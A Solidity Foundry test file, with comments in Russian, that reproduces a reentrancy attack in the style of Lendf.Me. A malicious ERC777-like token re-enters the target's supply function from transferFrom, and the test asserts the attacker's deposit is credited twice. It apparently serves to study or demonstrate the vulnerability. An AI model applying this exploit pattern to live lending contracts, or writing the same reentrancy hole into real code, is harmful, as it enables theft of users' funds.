// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/LendfMeTarget.sol";

// Вредоносный токен стандарта ERC777
contract MaliciousToken {
    LendfMeTarget public target;
    bool public attacking = false;

    // Функция для установки адреса протокола
    function setTarget(address _target) external {
        target = LendfMeTarget(_target);
    }

    // Триггер атаки
    function startAttack() external {
        target.supply(1 ether);
    }

    // Протокол вызывает эту функцию, чтобы "забрать" токены
    function transferFrom(address, address, uint256) external returns (bool) {
        if (!attacking) {
            attacking = true;
            // REENTRANCY: Снова вызываем supply до того, как первый вызов завершился!
            target.supply(1 ether);
        }
        return true;
    }
}

contract LendfMeAttackTest is Test {
    LendfMeTarget target;
    MaliciousToken evilToken;
    address attacker = address(0x1);

    function setUp() public {
        // 1. Создаем токен
        evilToken = new MaliciousToken();
        
        // 2. Создаем протокол, передаем ему адрес токена
        target = new LendfMeTarget(address(evilToken));
        
        // 3. Токен запоминает адрес протокола
        evilToken.setTarget(address(target));
    }

    function testExploit() public {
        vm.startPrank(attacker);

        console.log("=== BEFORE ATTACK ===");
        console.log("EvilToken deposit:", target.getDeposit(address(evilToken)));

        // --- ЭКСПЛУАТАЦИЯ ---
        evilToken.startAttack();
        // ----------------------

        console.log("=== AFTER ATTACK ===");
        console.log("EvilToken deposit:", target.getDeposit(address(evilToken)));

        vm.stopPrank();

        // Хакер внес 1 токен, но из-за Reentrancy ему начислило 2!
        assertEq(target.getDeposit(address(evilToken)), 2 ether);
    }
}
